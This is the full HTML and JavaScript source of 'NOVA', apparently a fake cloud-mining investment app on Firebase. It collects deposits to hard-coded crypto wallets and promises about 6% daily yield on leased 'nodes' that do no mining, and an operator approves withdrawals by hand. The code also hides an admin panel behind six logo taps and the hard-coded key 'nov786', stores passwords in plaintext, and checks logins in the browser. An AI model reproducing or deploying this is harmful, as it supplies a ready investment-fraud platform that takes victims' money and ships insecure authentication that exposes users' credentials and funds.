<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NOVA | Enterprise Cloud Protocol</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;600;800&display=swap" rel="stylesheet">
    <style>
        :root { --gold: #D4AF37; --bg: #030303; --glass: rgba(255, 255, 255, 0.03); }
        body { background: var(--bg); color: #fff; font-family: 'Plus Jakarta Sans', sans-serif; -webkit-tap-highlight-color: transparent; }
        .glass-panel { background: var(--glass); border: 1px solid rgba(255,255,255,0.06); border-radius: 28px; backdrop-filter: blur(20px); }
        .btn-gold { background: linear-gradient(135deg, #D4AF37, #FBE795); color: #000; font-weight: 800; border-radius: 18px; transition: 0.3s; text-transform: uppercase; font-size: 11px; letter-spacing: 1px; }
        .btn-gold:active { transform: scale(0.96); }
        .nova-input { background: rgba(255,255,255,0.02); border: 1px solid #1a1a1a; width: 100%; padding: 18px; border-radius: 20px; color: #fff; font-size: 14px; outline: none; margin-bottom: 12px; }
        .screen { display: none; padding-bottom: 120px; animation: slideIn 0.4s ease; }
        .active-screen { display: block; }
        @keyframes slideIn { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }
        .nav-bar { position: fixed; bottom: 0; left: 0; right: 0; background: rgba(5,5,5,0.9); border-top: 1px solid #111; display: flex; justify-content: space-around; padding: 22px; z-index: 1000; backdrop-filter: blur(20px); }
        .nav-item { color: #444; font-size: 10px; font-weight: 800; display: flex; flex-direction: column; align-items: center; gap: 6px; transition: 0.3s; }
        .nav-item.active { color: var(--gold); }
        .modal { display: none; position: fixed; inset: 0; background: #000; z-index: 2000; padding: 25px; overflow-y: auto; }
        .badge { font-size: 8px; padding: 4px 10px; border-radius: 20px; font-weight: 900; }
    </style>
</head>
<body>

    <div id="auth-screen" class="min-h-screen flex flex-col p-10 justify-center active-screen">
        <h1 onclick="handleTaps()" class="text-5xl font-black mb-2 tracking-tighter italic">NOVA<span class="text-[#D4AF37]">.</span></h1>
        <p class="text-[10px] text-gray-600 font-black tracking-[8px] uppercase mb-16">Global Mining Terminal</p>
        <div class="space-y-3">
            <input type="text" id="u-email" placeholder="Terminal ID" class="nova-input">
            <input type="password" id="u-pass" placeholder="Security Passkey" class="nova-input">
            <input type="text" id="adm-key" placeholder="System Root Override" class="hidden nova-input border-[#D4AF37]">
            <button onclick="auth()" class="w-full btn-gold py-5 shadow-2xl shadow-[#D4AF37]/10">Initialize Session</button>
            <p onclick="toggleM()" id="m-text" class="text-center text-[10px] mt-10 text-gray-500 font-black uppercase cursor-pointer tracking-widest">Register New Identity</p>
        </div>
    </div>

    <div id="app" class="hidden">
        <header class="p-6 flex justify-between items-center sticky top-0 bg-black/60 backdrop-blur-md z-50">
            <div class="flex items-center gap-3">
                <div class="w-9 h-9 glass-panel flex items-center justify-center text-[#D4AF37] font-black border-[#D4AF37]/30">N</div>
                <p id="user-display" class="text-[10px] font-black uppercase text-gray-500"></p>
            </div>
            <i onclick="location.reload()" class="fa-solid fa-power-off text-gray-800"></i>
        </header>

        <div id="dash-screen" class="screen active-screen px-6">
            <div class="glass-panel p-10 mb-6 border-b-4 border-[#D4AF37]/20 text-center">
                <p class="text-[9px] text-gray-500 font-black tracking-[5px] uppercase mb-4">Secured Portfolio Value</p>
                <h1 id="main-bal" class="text-6xl font-black tracking-tighter">$0.00</h1>
                <p id="v-daily" class="text-[10px] font-black text-green-500 mt-5 uppercase tracking-widest">Yield: +$0.00 Daily</p>
            </div>

            <div class="grid grid-cols-2 gap-4 mb-8">
                <button onclick="openModal('dep-modal')" class="glass-panel p-6 flex flex-col items-center gap-3 text-green-500"><i class="fa-solid fa-plus text-xl"></i><span class="text-[9px] font-black uppercase">Deposit</span></button>
                <button onclick="openModal('wd-modal')" class="glass-panel p-6 flex flex-col items-center gap-3 text-red-500"><i class="fa-solid fa-minus text-xl"></i><span class="text-[9px] font-black uppercase">Extract</span></button>
            </div>

            <div class="space-y-4 mb-10">
                <div class="glass-panel p-6">
                    <p class="text-[9px] font-black text-gray-500 mb-3 uppercase">Apply Reward Code</p>
                    <div class="flex gap-2">
                        <input type="text" id="promo-inp" placeholder="CODE" class="nova-input mb-0 flex-1 py-3 text-xs uppercase">
                        <button onclick="applyPromo()" class="btn-gold px-6 text-[9px]">Apply</button>
                    </div>
                </div>
                <div class="glass-panel p-6 flex justify-between items-center">
                    <div>
                        <p class="text-[9px] font-black text-gray-500 mb-1 uppercase tracking-widest">Referral ID</p>
                        <span id="ref-id" class="text-xs font-black text-[#D4AF37]">NOVA-9912</span>
                    </div>
                    <button onclick="alert('Copied!')" class="text-[9px] font-black text-gray-300">COPY LINK</button>
                </div>
            </div>
        </div>

        <div id="mine-screen" class="screen px-6">
            <h2 class="text-3xl font-black mb-8 italic uppercase tracking-tighter">Hardware <span class="text-[#D4AF37]">Rigs</span></h2>
            <div id="nodes-container" class="space-y-5"></div>
        </div>

        <div id="hist-screen" class="screen px-6">
            <h2 class="text-3xl font-black mb-8 italic uppercase tracking-tighter">System <span class="text-[#D4AF37]">Logs</span></h2>
            <div id="hist-container" class="space-y-4"></div>
        </div>

        <nav class="nav-bar">
            <div onclick="nav('dash-screen')" class="nav-item active" id="nav-dash"><i class="fa-solid fa-house-user text-xl"></i><span>CORE</span></div>
            <div onclick="nav('mine-screen')" class="nav-item" id="nav-mine"><i class="fa-solid fa-server text-xl"></i><span>FARM</span></div>
            <div onclick="nav('hist-screen')" class="nav-item" id="nav-hist"><i class="fa-solid fa-file-invoice text-xl"></i><span>LOGS</span></div>
        </nav>
    </div>

    <div id="dep-modal" class="modal">
        <div onclick="closeModal('dep-modal')" class="mb-10 text-gray-500 font-black text-[10px] uppercase">Back</div>
        <h2 class="text-4xl font-black mb-10 italic">FUNDING GATEWAY</h2>
        <select id="dep-method" class="nova-input" onchange="updateAddr()">
            <option value="Binance">Binance (USDT-TRC20)</option>
            <option value="Trust">Trust Wallet (BEP20)</option>
            <option value="Jazz">JazzCash / EasyPaisa</option>
        </select>
        <div class="glass-panel p-6 mb-8 text-center border-dashed border-gray-800">
            <p id="dep-addr" class="text-[11px] font-mono break-all text-gray-400">0xb584fBe3d7f1A72AEb2A0a76b1bC959841eC0A37</p>
        </div>
        <input type="number" id="dep-amt" placeholder="Deposit Amount ($)" class="nova-input">
        <input type="text" id="dep-tid" placeholder="Transaction ID (TID)" class="nova-input">
        <p class="text-[9px] text-gray-600 font-black mb-3 uppercase tracking-widest">Upload Digital Proof</p>
        <input type="file" id="dep-proof" accept="image/*" class="text-[10px] text-gray-500 mb-10">
        <button onclick="requestFin('Deposit')" class="w-full btn-gold py-5">Initiate Deposit</button>
    </div>

    <div id="wd-modal" class="modal">
        <div onclick="closeModal('wd-modal')" class="mb-10 text-gray-500 font-black text-[10px] uppercase">Back</div>
        <h2 class="text-4xl font-black mb-10 text-red-500 italic">ASSET EXTRACTION</h2>
        <input type="number" id="wd-amt" placeholder="Extraction Amount ($)" class="nova-input">
        <input type="text" id="wd-acc" placeholder="Account Title / Wallet" class="nova-input">
        <button onclick="requestFin('Withdrawal')" class="w-full bg-white text-black font-black py-5 rounded-2xl uppercase text-[11px]">Authorize Transfer</button>
    </div>

    <div id="admin-panel" class="hidden fixed inset-0 bg-black z-[9999] p-8 overflow-y-auto">
        <div class="flex justify-between items-center mb-10 border-b border-white/5 pb-6">
            <h2 class="text-[#D4AF37] font-black uppercase text-sm tracking-widest">System Control Hub</h2>
            <button onclick="location.reload()" class="text-red-500 font-black text-xs uppercase">Disconnect</button>
        </div>
        <div id="adm-list" class="space-y-5"></div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getFirestore, doc, setDoc, getDoc, updateDoc, addDoc, collection, onSnapshot, query, where, orderBy } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

        const firebaseConfig = { apiKey: "AIzaSyAXlQ1tKTJbcnIXNeww9I3d-ukzD7_mUCo", authDomain: "home-94d45.firebaseapp.com", projectId: "home-94d45", appId: "1:964390949419:web:589840cb91b7e42ecd506e" };
        const app = initializeApp(firebaseConfig); const db = getFirestore(app);
        let activeUser = null; let isLogin = true;

        const addrs = { "Binance": "0xb584fBe3d7f1A72AEb2A0a76b1bC959841eC0A37", "Trust": "0xc270914e5a9e72C5994fb4bd9BbdD9A3425303f2", "Jazz": "0312-XXXXXXX" };
        window.updateAddr = () => { document.getElementById('dep-addr').innerText = addrs[document.getElementById('dep-method').value]; };

        window.auth = async () => {
            const id = document.getElementById('u-email').value.toLowerCase().trim();
            const pw = document.getElementById('u-pass').value;
            const ak = document.getElementById('adm-key').value;
            if(ak === "nov786") { document.getElementById('admin-panel').classList.remove('hidden'); loadAdmin(); return; }
            if(!id || !pw) return alert("Credentials Missing");
            const uRef = doc(db, "users", id); const s = await getDoc(uRef);
            if(!isLogin) {
                if(s.exists()) return alert("Node Identity Occupied");
                await setDoc(uRef, { balance: 0, password: pw, daily: 0, ref: "NOVA-" + Math.floor(1000 + Math.random()*8999) });
                start(id);
            } else if(s.exists() && s.data().password === pw) {
                start(id);
            } else alert("Access Denied");
        };

        function start(id) {
            activeUser = id; document.getElementById('auth-screen').style.display = 'none';
            document.getElementById('app').classList.remove('hidden');
            onSnapshot(doc(db, "users", id), d => {
                const data = d.data();
                document.getElementById('main-bal').innerText = "$" + (data.balance || 0).toFixed(2);
                document.getElementById('v-daily').innerText = "Yield: +$" + (data.daily || 0).toFixed(2) + " Daily";
                document.getElementById('ref-id').innerText = data.ref;
                document.getElementById('user-display').innerText = "ID: " + id;
            });
            loadHistory(); renderNodes();
        }

        window.requestFin = async (type) => {
            const uRef = doc(db, "users", activeUser); const s = await getDoc(uRef);
            let payload = { user: activeUser, type, status: 'Pending', time: Date.now() };
            if(type === 'Deposit') {
                payload.amount = parseFloat(document.getElementById('dep-amt').value);
                payload.tid = document.getElementById('dep-tid').value;
                const file = document.getElementById('dep-proof').files[0];
                if(file) {
                    const r = new FileReader(); r.onloadend = async () => { payload.proof = r.result; await addDoc(collection(db, "logs"), payload); alert("Transmitted to Ledger"); closeModal('dep-modal'); }; r.readAsDataURL(file);
                } else { await addDoc(collection(db, "logs"), payload); alert("Transmitted"); closeModal('dep-modal'); }
            } else {
                payload.amount = parseFloat(document.getElementById('wd-amt').value);
                payload.acc = document.getElementById('wd-acc').value;
                if(s.data().balance < payload.amount) return alert("Liquidity Error");
                await updateDoc(uRef, { balance: s.data().balance - payload.amount });
                await addDoc(collection(db, "logs"), payload); alert("Extraction Authorized"); closeModal('wd-modal');
            }
        };

        function loadHistory() {
            onSnapshot(query(collection(db, "logs"), where("user", "==", activeUser), orderBy("time", "desc")), s => {
                const container = document.getElementById('hist-container'); container.innerHTML = "";
                s.forEach(d => {
                    const r = d.data();
                    container.innerHTML += `<div class="glass-panel p-6 flex justify-between items-center border-l-4 ${r.status=='Pending'?'border-yellow-500':'border-green-500'}">
                        <div><p class="text-[8px] font-black uppercase text-gray-500 tracking-widest">${r.type}</p><p class="text-lg font-black">$${r.amount}</p></div>
                        <span class="badge ${r.status=='Pending'?'bg-yellow-500/10 text-yellow-500':'bg-green-500/10 text-green-500'}">${r.status.toUpperCase()}</span>
                    </div>`;
                });
            });
        }

        window.applyPromo = async () => {
            const code = document.getElementById('promo-inp').value.toUpperCase();
            if(code === "NOVA100") {
                const uRef = doc(db, "users", activeUser); const s = await getDoc(uRef);
                await updateDoc(uRef, { balance: s.data().balance + 100 });
                alert("Promo Applied! $100 Secured.");
            } else alert("Invalid Code");
        };

        function renderNodes() {
            const c = document.getElementById('nodes-container'); c.innerHTML = "";
            const names = ["S-PRO CLUSTER", "ALFA QUANTUM", "NANO TITAN", "OMEGA MINER"];
            for(let i=1; i<=20; i++) {
                let p = i===1?15:(i*110); let y = (p*0.06).toFixed(2);
                c.innerHTML += `<div class="glass-panel p-8 relative overflow-hidden">
                    <div class="flex justify-between items-start mb-10">
                        <div><p class="text-[8px] font-black text-[#D4AF37] uppercase mb-1">${names[i%4]}</p><h4 class="text-xl font-black italic">NODE v.${i}</h4></div>
                        <span class="badge bg-white/10 text-white">UPTIME 99.9%</span>
                    </div>
                    <div class="flex justify-between items-end border-t border-white/5 pt-6">
                        <div><p class="text-[8px] text-gray-600 font-black uppercase mb-1">Contract Price</p><p class="text-3xl font-black tracking-tighter text-[#D4AF37]">$${p}</p></div>
                        <button onclick="buyNode(${p},${y})" class="btn-gold px-10 py-4 shadow-xl">Lease</button>
                    </div>
                </div>`;
            }
        }

        window.buyNode = async (p, d) => {
            const uRef = doc(db, "users", activeUser); const s = await getDoc(uRef);
            if(s.data().balance < p) return alert("Insufficient Liquidity");
            await updateDoc(uRef, { balance: s.data().balance - p, daily: (s.data().daily || 0) + parseFloat(d) });
            alert("Hardware Synchronized!");
        };

        function loadAdmin() {
            onSnapshot(query(collection(db, "logs"), where("status", "==", "Pending")), s => {
                const al = document.getElementById('adm-list'); al.innerHTML = "";
                s.forEach(d => {
                    const r = d.data();
                    al.innerHTML += `<div class="glass-panel p-6 border-l-4 ${r.type=='Deposit'?'border-green-500':'border-red-500'}">
                        <div class="flex justify-between items-center mb-4"><span class="text-[9px] font-black uppercase text-gray-500">${r.type}</span><span class="text-2xl font-black">$${r.amount}</span></div>
                        <p class="text-[8px] text-gray-500 mb-6 uppercase tracking-widest">USER: ${r.user} | REF: ${r.tid || r.acc}</p>
                        ${r.proof ? `<button onclick="window.open('${r.proof}')" class="text-blue-500 text-[10px] underline mb-6 block font-black uppercase">Inspect Proof</button>` : ''}
                        <div class="flex gap-2">
                            <button onclick="approve('${d.id}','${r.user}',${r.amount},'${r.type}')" class="flex-1 bg-green-600 py-4 rounded-2xl text-[9px] font-black uppercase">Approve</button>
                            <button onclick="reject('${d.id}','${r.user}',${r.amount},'${r.type}')" class="flex-1 bg-red-600 py-4 rounded-2xl text-[9px] font-black uppercase">Reject</button>
                        </div>
                    </div>`;
                });
            });
        }

        window.approve = async (id, u, a, t) => { if(t === 'Deposit') { const uR = doc(db, "users", u); const us = await getDoc(uR); await updateDoc(uR, { balance: (us.data().balance || 0) + a }); } await updateDoc(doc(db, "logs", id), { status: 'Success' }); };
        window.reject = async (id, u, a, t) => { if(t === 'Withdrawal') { const uR = doc(db, "users", u); const us = await getDoc(uR); await updateDoc(uR, { balance: (us.data().balance || 0) + a }); } await updateDoc(doc(db, "logs", id), { status: 'Rejected' }); };
        window.handleTaps = () => { window.taps = (window.taps || 0) + 1; if(window.taps >= 6) document.getElementById('adm-key').classList.remove('hidden'); };
        window.toggleM = () => { isLogin = !isLogin; document.getElementById('m-text').innerText = isLogin ? "Register New Identity" : "Back to Terminal"; };
        window.openModal = (id) => document.getElementById(id).style.display = 'block';
        window.closeModal = (id) => document.getElementById(id).style.display = 'none';
        window.nav = (id) => {
            document.querySelectorAll('.screen').forEach(s => s.classList.remove('active-screen'));
            document.getElementById(id).classList.add('active-screen');
            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
            document.getElementById('nav-' + id.split('-')[0]).classList.add('active');
        };
    </script>
</body>
</html>
